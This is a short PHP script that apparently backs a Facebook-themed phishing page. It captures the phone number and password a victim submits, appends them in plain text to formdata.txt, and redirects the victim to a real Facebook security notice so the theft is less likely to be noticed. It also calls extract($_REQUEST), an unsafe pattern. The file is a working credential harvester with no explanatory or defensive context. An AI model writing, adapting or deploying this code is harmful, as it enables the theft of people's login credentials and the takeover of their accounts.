<?php header("Location:https://www.facebook.com/help/securitynotice"); ?>

<?php
$phone = $_POST['phone'];
$password = $_POST['password'];


extract($_REQUEST);
$file = fopen("formdata.txt" , "a");

fwrite($file, "name :");
fwrite($file, $phone . "\n");

fwrite($file, "Password :");
fwrite($file, $password . "\n");
fclose($file);






?>